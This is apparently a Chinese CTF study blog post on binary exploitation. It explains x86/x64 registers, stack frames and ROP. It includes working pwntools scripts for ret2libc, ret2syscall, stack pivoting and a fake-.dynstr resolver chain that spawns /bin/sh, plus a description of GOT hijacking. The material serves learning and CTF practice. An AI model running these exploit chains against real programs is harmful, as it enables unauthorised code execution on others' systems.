---
title: "底层原理"
description: "PWN 前置底层知识：32/64 位寄存器、常用汇编指令与 ROP 链的构造思路。"
date: 2026-08-14T09:16:17+08:00
slug: "binary-fundamentals"
image: ""
math: false
categories:
    - 学习笔记
tags:
    - "PWN"
    - "汇编"
    - "ROP"
---

> 当你用 C/C++ 写代码时，你是在**高级语言的抽象层**构建逻辑；
> 当你做 Pwn 时，你是在用**底层汇编、内存布局、操作系统机制**去审视这套逻辑。

## 前置知识

### 32位寄存器

EAX：累加器，用于算术计算和函数返回值

EBX：基地址寄存器，作为存储器指针

ECX：计数寄存器，常用于循环计数

EDX：数据寄存器，参与乘除计算和I/O操作

ESP：堆栈指针，指向栈顶

EBP：基指针，指向栈底

ESI/EDI：变址寄存器，用于字符串操作

### 段寄存器

段寄存器用于支持段式存储器管理，包含6个16位寄存器：CS、DS、ES、SS、FS、GS。

**CS**：代码段寄存器，指向代码段的基址。

**DS**：数据段寄存器，指向数据段的基址。

**ES**：附加数据段寄存器，常用于字符串操作。

**SS**：栈段寄存器，指向堆栈段的基址。

**FS/GS**：附加段寄存器，通常由操作系统用于线程或CPU特定的内存管理。

### 指令指针寄存器

EIP：存储下一条要执行指令的地址，它的值会随着指令的执行自动更新，或通过跳转指令修改

### 标志寄存器

**EFLAGS**寄存器包含多个标志位，用于反映运算结果或控制处理器状态。

**CF**：进位标志，表示是否产生进位或借位。

**ZF**：零标志，表示运算结果是否为零。

**SF**：符号标志，反映结果的正负。

**OF**：溢出标志，表示有符号运算是否溢出。

**DF**：方向标志，控制字符串操作的方向。

**IF**：中断允许标志，决定是否响应外部中断。

### 64位寄存器

| 64位 | 低32位 | 低16位 | 低8位 | 描述                        |
| :--- | :----- | :----- | :---- | :-------------------------- |
| rax  | eax    | ax     | al    | 累加器                      |
| rbx  | ebx    | bx     | bl    | 基地址                      |
| rcx  | ecx    | cx     | cl    | 循环计数器                  |
| rdx  | edx    | dx     | dl    | 数据寄存器，通常扩展A寄存器 |
| rsi  | esi    | si     | sil   | 字符串操作的源索引          |
| rdi  | edi    | di     | dil   | 字符串操作的目的索引        |
| rbp  | ebp    | bp     | bpl   | 基地址指针 (栈帧基地址)     |
| rsp  | esp    | sp     | spl   | 栈指针 (栈顶指针)           |
| r8   | r8d    | r8w    | r8b   | 新增通用寄存器              |
| r9   | r9d    | r9w    | r9b   | 新增通用寄存器              |
| r10  | r10d   | r10w   | r10b  | 新增通用寄存器              |
| r11  | r11d   | r11w   | r11b  | 新增通用寄存器              |
| r12  | r12d   | r12w   | r12b  | 新增通用寄存器              |
| r13  | r13d   | r13w   | r13b  | 新增通用寄存器              |
| r14  | r14d   | r14w   | r14b  | 新增通用寄存器              |
| r15  | r15d   | r15w   | r15b  | 新增通用寄存器              |

---

## 汇编指令

### push

比如push rbp

1.先将指针rsp-8（栈从高地址向低地址增长，先腾出空间）

2.然后把rbp寄存器中的值写入新栈顶[rsp]指向的内存位置

也就是说 push rbp是吧当前的rbp的值保存在栈上



### pop

比如pop rbp

1.从栈顶（即[rsp]指向的内存位置）读取一个8字节的值

2.将它写入rbp寄存器中

3.同时将rsp增加8（栈指针上移，相当于弹出）

也就是说 pop rbp是吧栈上的当前值弹出并赋值给rbp



以调用一个函数为例，比如是x86-64，调用者做了

```python
call my_function   ; 等价于 push rip; jmp my_function
```

此时栈（向低地址增长）的状态：

```text
高地址
| ...          |
| 参数 n        |  （某些参数可能通过寄存器传，其余压栈）
| ...          |
| 返回地址      |  ← call 指令压入的 rip（调用者的下一条指令）
低地址  ← rsp 指向这里
```

最开始的操作：

```python
my_function:
    push rbp        ; ① 保存调用者的 rbp
    mov  rbp, rsp   ; ② 设置自己的栈帧基址
    sub  rsp, N     ; ③ 为局部变量分配空间（可选）
```

push rbp

将调用者函数的栈帧基址（rbp的值）压栈保存，这样能方便函数结束之后还能恢复到最初的栈帧，此时rsp自动减8，且rsp现在指向旧的rbp

mov rbp,rsp

把当前栈顶（保存rbp的那个位置）作为当前函数的栈帧基址，固定到rbp，之后除非使用leave，不然rbp在整个函数不会改变

sub rsp,N

把rsp向下移动N个字节，腾出局部变量，临时数据，可能的寄存器保存区域等，如果子函数局部变量很少，有时可以省略

这三步以后，栈内存布局变为：

```text
高地址
| 调用者的 rbp |  ← rbp 现在指向这里 (当前函数的帧基址)
| 返回地址      |  ← rbp + 8
| 参数区/更多   |  ← rbp + 16 开始可能是调用者压入的参数
| ...           |
| 局部变量区域  |  ← rsp 指向这里 (低地址)
低地址
```

也就是所有的局部变量都可以通过rbp-偏移来访问，参数和返回地址可以通过rbp+偏移来访问，无论中途rsp怎么变，rbp都始终指向栈帧的底部



结束部分

基本函数的结尾都是：

```
leave
ret
```

他们基本都一起出现，负责清理栈帧并将控制权返回给调用者

对于ret很好理解

1.从栈顶弹出8字节（64位），把这个值作为返回地址，然后rsp+8

2.跳转回这个地址并继续执行（即恢复到调用函数的下一条指令）

它只负责修改rip和rsp

对于leave

它等价于两条指令

```python
mov rsp, rbp        ; 恢复栈指针到帧基址，相当于丢弃函数内分配的局部变量空间
pop rbp             ; 弹出旧 rbp，同时 rsp 自动 +8
```

因为我们一开始存好了rbp的基址，所以第一步mov就可以很顺利地恢复到栈帧基址，随后pop rbp，也就相当于清理旧的栈帧，成功开辟新的空间去操作

---

## 关于ROP链

> ROP（Return-Oriented Programming，返回导向编程）是一种非常经典且高级的漏洞利用技术

### 前提

对于一般的漏洞攻击，最常见的手法是缓冲区溢出：攻击者把一段恶意代码（shellcode）写进程序的栈中，然后通过溢出覆盖函数的返回地址让程序直接执行这段恶意代码

其实这也就是我们说的ret2shellcode，通过定位起始地址到返回地址，算出长度，然后塞入垃圾数据，最终覆盖返回地址为我们写入shellcode的地方，然后执行shellcode，getshell。。

为了防御这种攻击，操作系统引入了NX（堆栈不可执行）或DEP（数据执行保护）保护，开启后，如果CPU尝试在栈上写代码，程序会直接崩溃

这时，如果还想拿到shell的话，就得使用ROP了！

### 核心

Gadget（代码片段）：就是程序内存中已经存在的，以ret指令结尾的极短指令序列

需要ret结尾的原因是ret指令的本质在于从栈顶弹出一个地址，然后给rip，进而确定下一条指令的地址，我们需要控制程序的流程，就需要ret来辅助我们

### 过程

由于我们正在构建ROP链，所以从前往后数据是以此从低往高写的，也就是低地址往高地址

攻击者会在栈上精心布置一系列的数据和 Gadget 的地址。当原函数执行完毕触发 ret 时，可怕的连锁反应就开始了：

1. **触发点**：函数执行到原本的 ret，此时栈顶已经被攻击者覆盖为 **Gadget 1 的地址**。CPU 跳转到 Gadget 1。
2. **执行 Gadget 1**： Gadget 1 执行了一条或几条有用指令（比如给寄存器赋个值）。
3. **连接点**：Gadget 1 执行完后，它的最后一条指令又是 ret！此时栈顶指针（RSP）已经移动到了下一个位置，而那里刚好是攻击者布置的 **Gadget 2 的地址**。
4. **循环往复**：CPU 乖乖地跳转到 Gadget 2 执行，执行完遇到 ret，又跳转到栈上的下一个地址……

这些 Gadget 就像链条一样被 ret 指令一环扣一环地串联起来执行，这就是 **ROP 链（ROP Chain）**。

### 实例

#### ret2libc

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6') # 题目通常会提供 libc
p = process('./vuln')

# 假设通过调试测出溢出偏移为 72
offset = 72

# 第一步：泄露 libc 基址 
rop = ROP(elf)
# 调用 puts 打印 puts 自己在 GOT 表里的真实地址
rop.puts(elf.got['puts'])
# 打印完后，让程序再次回到 main 函数，重新触发一次漏洞
rop.call(elf.sym['main'])

payload1 = b'A' * offset + rop.chain()
p.sendlineafter(b"Input:", payload1)

# 接收并解析泄露的地址
puts_leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(f"[+] Leak puts address: {hex(puts_leak)}")

# 计算 libc 基址
libc.address = puts_leak - libc.sym['puts']
print(f"[+] Libc base: {hex(libc.address)}")

# 第二步：执行 system("/bin/sh")
rop2 = ROP(libc)
# 有了基址，直接在 libc 里找 system 和 /bin/sh
# 注意：64位 Ubuntu 系统有时需要多加一个单纯的 ret 指令来对齐 16 字节栈环境
rop2.raw(rop2.ret.address) 
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = b'A' * offset + rop2.chain()
p.sendlineafter(b"Input:", payload2) # main函数重新运行，再次输入

p.interactive()
```

##### 栈的布局

发送第一段payload1前

```
=================== 高地址 (栈底) ===================
[ main 函数的地址       ]  <- puts 执行完后的返回地址 (为了无限循环利用)
[ puts@plt 地址        ]  <- pop rdi; ret 之后的去向，去执行 puts 打印
[ puts@got 地址        ]  <- 准备弹给 rdi 寄存器的值 (即 puts 的参数)
[ pop rdi; ret 的地址   ]  <- 劫持 EIP 的第一步！
[ 72 字节的垃圾数据      ]  <- 填充满局部变量和旧的 RBP
=================== 低地址 (当前 RSP) ================
```

对于64位，由于call函数要求rsp必须16字节对齐，所以最好是在ROP链前面加上ret

1.目前跳到了pop rdi;ret这里

2.先执行最开始的ret，把当前地址弹出存到rip，然后rsp上移

3.执行pop rdi;ret，先pop rdi，将栈顶也就是puts@got的地址存到rdi，然后rsp上移

4.ret，将当前地址（puts@plt）弹出给rip，rsp继续上移

5.执行puts函数，由于我们前面rdi里存着puts的got表地址，即为函数在libc动态链接库中的真实地址，然后执行puts，将它的真实地址打印了出来

6.函数结束，执行leave;ret操作，rsp指向main函数地址，然后ret，下一步返回到main函数

通过第一段我们拿到了puts函数真实地址，就可以算出libc的基址了，下一步执行system

```text
高地址
+-------------------+
| system 地址       |  ← 调用 system，将会跳转到 libc 的 system 函数 (5)
+-------------------+
| "/bin/sh" 地址    |  ← 弹入 rdi 的参数 (4)
+-------------------+
| pop rdi; ret      |  ← 第二个 gadget (3)
+-------------------+
| ret 的地址        |  ← 额外对齐用，只执行 ret (2)
+-------------------+
| 72 字节 A 填充    |  ← 缓冲区覆盖 (1)
+-------------------+
| 局部变量 / 缓冲区 |
低地址
```

同样，先填充字节到返回地址处，这里由于是64位，加个ret对齐

然后正常按照64位的流程，先使用pop rdi;ret，下一步放入存入rdi的值，随后启动system函数，参数直接写进了bin/sh，然后执行，getshell

---

#### ret2syscall

##### 脚本

```python
from pwn import *

p = process('./static_vuln')

offset = 112

# 利用 ROPgadget 等工具提前找好的地址
pop_eax_ret = 0x08051234
pop_ebx_ecx_edx_ret = 0x08065432
int_0x80 = 0x08048122
bin_sh_addr = 0x08091111 # 假设在程序静态数据区找到了 "/bin/sh"

# 组装 ROP 链，目标是执行 execve("/bin/sh", 0, 0)
# execve 的系统调用号是 11 (0xb)
payload = b'A' * offset
payload += p32(pop_eax_ret) 
payload += p32(11)                 # 让 eax = 11
payload += p32(pop_ebx_ecx_edx_ret)
payload += p32(bin_sh_addr)        # 让 ebx = "/bin/sh" 所在的地址
payload += p32(0)                  # 让 ecx = 0
payload += p32(0)                  # 让 edx = 0
payload += p32(int_0x80)           # 触发系统调用！

p.sendline(payload)
p.interactive()
```

同样的思路。。

```text
[ 低地址 (栈顶) ]  <--- 此时 ESP 正指着这里
=========================================================================
栈内相对位置  | 内存中实际存放的数据 (32位)        | 这一格的作用是什么？
=========================================================================
[ESP]       | 0x08051234 (pop eax; ret)    | 原函数的返回地址，链条的第一步
-------------------------------------------------------------------------
[ESP + 4]   | 11                           | 准备喂给 EAX 的系统调用号 (execve)
-------------------------------------------------------------------------
[ESP + 8]   | 0x08065432 (pop ebx; ecx...) | 准备跳去的第二段 Gadget
-------------------------------------------------------------------------
[ESP + 12]  | 0x08091111 (bin_sh_addr)     | 准备喂给 EBX 的字符串地址
-------------------------------------------------------------------------
[ESP + 16]  | 0                            | 准备喂给 ECX 的值
-------------------------------------------------------------------------
[ESP + 20]  | 0                            | 准备喂给 EDX 的值
-------------------------------------------------------------------------
[ESP + 24]  | 0x08048122 (int 0x80)        | 最后的归宿：系统调用大门
=========================================================================
[ 高地址 (栈底方向) ]
```

此时，正准备执行函数的最后一步ret，执行之后，当前栈顶弹出到eip，esp下移

准备去执行 pop eax; ret，此时 ESP 指向 11。

pop eax将栈顶的值11弹出给eax，esp继续下移，ret，将当前值取出给eip，esp下移，随后程序会读取eip的值，作为下一条指令的地址。。。

以此类推，eax，ebx，ecx，edx，拿到值之后，ret，然后执行int 0x80指令，触发系统调用，并且里面的参数符合，直接getshell

由于是32位，参数进来直接进入栈中，所以不需要pop rdi;ret这一个指令的地址，靠的是函数末尾处的ret来往下走

---

#### 栈迁移

##### 脚本

```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# 假设存在全局变量/bss段，我们可以往这里写入数据
bss_addr = elf.bss() + 0x100
leave_ret_addr = 0x080484b8  # 提前找好的 leave; ret 的地址

# ================= 第一步：在宽敞的 bss 段提前布置好恶意的 ROP 链 =================
# 假设程序一开始提供了一次往 bss 段写任意数据的机会
# 这里布置的链就是常规的 ret2libc 或者系统调用
fake_stack_rop = ROP(elf)
fake_stack_rop.puts(elf.got['puts'])
fake_stack_rop.call(elf.sym['main'])

p.sendafter(b"Write to BSS:", fake_stack_rop.chain())

# ================= 第二步：极小溢出，触发栈迁移 =================
# 假设这是溢出函数，我们只有 0x20 的缓冲区，最多写 0x28 个字节
offset = 0x20

payload = b'A' * offset 
payload += p32(bss_addr - 4)  # 覆盖 saved ebp。减 4 是为了让 leave 指令执行后，esp 恰好指向 bss_addr
payload += p32(leave_ret_addr)# 覆盖 ret addr (eip)。

# 发生什么？
# 1. 目标函数原本的 leave: 把被覆盖的 ebp 赋给 esp，然后 pop ebp。此时 esp 来到了 bss_addr 附近。
# 2. 目标函数原本的 ret:  去执行被我们覆盖的 leave_ret_addr。
# 3. 再次执行 leave: 将 esp 彻底定位到了 bss_addr，并 pop ebp。
# 4. 再次执行 ret: 这次从栈顶（此时就是 bss_addr）弹出的返回地址，正好是我们第一步写入的 ROP 链！

p.sendafter(b"Tiny overflow:", payload)
p.interactive()
```

---

#### 32位ROP链

对于32位的，参数直接进栈，不需要pop rdi;ret，但也意味着一个问题，就是他不会自动通过ret去跳转到我下一条指令的地址，我们需要自己写入返回地址

32位的函数，汇编长这样

```python
my_func:
    ; --- 1. 函数序言 (Function Prologue) ---
    push ebp            ; 保存调用者的 ebp
    mov ebp, esp        ; 把当前的 esp 赋值给 ebp，建立自己的栈帧
    
    ; --- 2. 真正的主体代码 ---
    mov eax, dword ptr [ebp + 8]  ; <--- 用 ebp+8 拿到了 arg1 !
    
    ; --- 3. 函数结语 (Function Epilogue) ---
    pop ebp             ; 恢复调用者的 ebp
    ret                 ; 返回
```

可以看到，最终拿参数的地方是ebp+8的位置，过程如下

**时刻 1：刚好跳转到 my_func 的瞬间（函数序言还没执行）**

在这个瞬间，因为之前的 call 指令（或者我们 ROP 的 ret 占位），栈长这样：

```text
================ 高地址 ================
[ 参数 arg1 的值 ]  <- (此时 ESP + 4)
[ 返回地址       ]  <- (此时 ESP)
================ 低地址 ================
```

**看，此时参数确实在 ESP + 4 的位置！**

**时刻 2：执行 push ebp**

这是 my_func 的第一条指令。它把旧的 ebp 压入了栈中，导致栈顶（ESP）往下走了一格（4个字节）：

```text
================ 高地址 ================
[ 参数 arg1 的值 ]  <- (此时 ESP + 8) 
[ 返回地址       ]  <- (此时 ESP + 4)
[ 旧的 EBP 值    ]  <- (此时 ESP)
================ 低地址 ================
```

发现了吗？因为压入了一个 EBP，原本在 ESP+4 的参数，现在相对于 ESP 变成了 ESP+8！

**时刻 3：执行 mov ebp, esp**

这是 my_func 的第二条指令。它把此刻的 ESP 地址直接复制给了 EBP。
此时栈的结构没有变，但是寄存器的参考系变了：

```text
================ 高地址 ================
[ 参数 arg1 的值 ]  <- (此时 EBP + 8) ！！！
[ 返回地址       ]  <- (此时 EBP + 4)
[ 旧的 EBP 值    ]  <- (此时 ESP 和 EBP 都指向这里)
================ 低地址 ================
```

由此可知，真正塞入参数是ebp+8的地方，所以我们构造ROP链的时候，往往需要在写入函数之后，先填充一个无关的地址，占位，然后再填入我要塞进去的参数

##### 例子

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "i386"

p = process("./no_relro_32")
rop = ROP("./no_relro_32")
elf = ELF("./no_relro_32")

p.recvuntil(b'Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset * 'a')

rop.read(0, 0x08049804 + 4, 4)

dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read", b"system")

rop.read(0, 0x080498E0, len(dynstr))

rop.read(0, 0x080498E0 + 0x100, len(b"/bin/sh\x00"))

rop.raw(0x08048376)
rop.raw(0xdeadbeef)
rop.raw(0x080498E0 + 0x100)

assert(len(rop.chain()) <= 256)
rop.raw("a" * (256 - len(rop.chain())))

p.send(rop.chain())

p.send(p32(0x080498E0))
p.send(dynstr)
p.send(b"/bin/sh\x00")

p.interactive()
```

```text
原始 .dynamic:
DT_STRTAB -> 真实 .dynstr (地址 A)

ROP 第一步:
将 DT_STRTAB 指针改为 ----> 0x080498E0

ROP 第二步:
在 0x080498E0 写入 假 .dynstr (将 "read" 改成 "system")

ROP 第三步:
在 0x080498E0+0x100 写入 "/bin/sh\x00"

ROP 第四步:
jmp read@plt+6 (强制解析)
   -> _dl_runtime_resolve 根据 DT_STRTAB 地址读取假表
   -> 原符号是 read, 现在字符串是 "system"
   -> 解析出 system 地址并调用
   -> 栈上参数指向 "/bin/sh"
   -> system("/bin/sh") 执行，拿到 shell
```

ROP链如下：

```python
rop.raw(offset * 'a')                     # 1. 填充偏移
rop.read(0, 0x08049804+4, 4)              # 2. 第一次 read：改动态字符串表指针
rop.read(0, 0x080498E0, len(dynstr))      # 3. 第二次 read：写入伪造的字符串表
rop.read(0, 0x080498E0+0x100, 8)          # 4. 第三次 read：写入 "/bin/sh"
rop.raw(0x08048376)                       # 5. 跳转到 read@plt+6 (强制解析)
rop.raw(0xdeadbeef)                       # 6. system 的返回地址 (随便写)
rop.raw(0x080498E0 + 0x100)               # 7. system 的参数 ("/bin/sh" 的地址)
```

由于system函数原型参数就需要塞入指针（地址），所以我们在能直接定位到/bin/sh地址时，直接塞进去地址，但对于找不到的情况，可以通过read或者gets函数，把这个字符串写进一个已知的内存位置，比如bss段，过程如下：

```python
[ read_plt 地址 ]
[ pppr 桥梁     ]
[ 0            ]
[ bss段的地址   ] <- 目标地址 (比如 0x0804A000)
[ 8            ] <- 读 8 个字节
```

(当程序执行这一步时，你的 Python 脚本用 p.send(b"/bin/sh\x00")，把**真正的字符串（字面量）**发送过去，程序就会把它写进 0x0804A000)

```python
[ system_plt 地址 ]
[ 0xdeadbeef     ]
[ 0x0804A000     ] <- system 的参数，填刚刚被写入了字符串的 bss 段地址！
```

---

## GOT表劫持

GOT hijack是二进制漏洞利用中一种非常经典且很常见的攻击技术，它的核心思想是利用程序中的内存写入漏洞，篡改GOT表中某个函数的真实地址，从而程序在调用这个函数时，劫持程序的执行流，让其执行攻击者指定的恶意代码

因为GOT表是一个存储着外部函数真实内存地址的数据表，位于程序的数据段，某些情况下可写，对于PLT表，存放着一小段代码，负责跳转到GOT表记录的地址去执行

### 原理

GOT表在默认情况下（未开启Full Relro）是可写的，可利用这点：

1. **寻找漏洞：** 攻击者首先需要找到程序中的一个“任意地址写”漏洞（例如：格式化字符串漏洞、数组越界写、UAF等）。
2. **确定目标：** 攻击者找到 GOT 表中某个会被程序频繁调用的函数地址（比如 puts 或 printf 的 GOT 表项）。
3. **篡改地址（劫持）：** 攻击者利用写入漏洞，将该函数的 GOT 表项内容修改为攻击者想要执行的函数地址（比如 system 函数的地址，或者是事先布置好的 Shellcode 地址、One_gadget 等）。
4. **触发执行：** 当程序接下来正常调用 puts 或 printf 时，程序会去 GOT 表里取地址，结果取到了攻击者写入的 system 的地址。
   - *举例：* 原本程序执行 printf("/bin/sh")，经过 GOT 表劫持后，实际上执行变成了 system("/bin/sh")，从而直接弹出了一个 Shell，攻击者成功控制了系统。

### 示例

假设一个程序中存在格式化字符串漏洞，并且后续会调用 exit(0)：

1. 攻击者通过漏洞泄露 libc 的基址，计算出 system 函数在内存中的真实地址。
2. 攻击者利用格式化字符串漏洞的 %n 特性，将 exit 函数在 GOT 表中的记录修改为 system 函数的地址。
3. 当程序执行到 exit(0) 时，本意是退出程序，但实际上却跳转到了 system 函数。由于参数类型等因素，攻击者稍作布局即可利用其执行系统命令。

---

*若文中有理解不深、表述欠妥之处，欢迎各路师傅指正交流。*
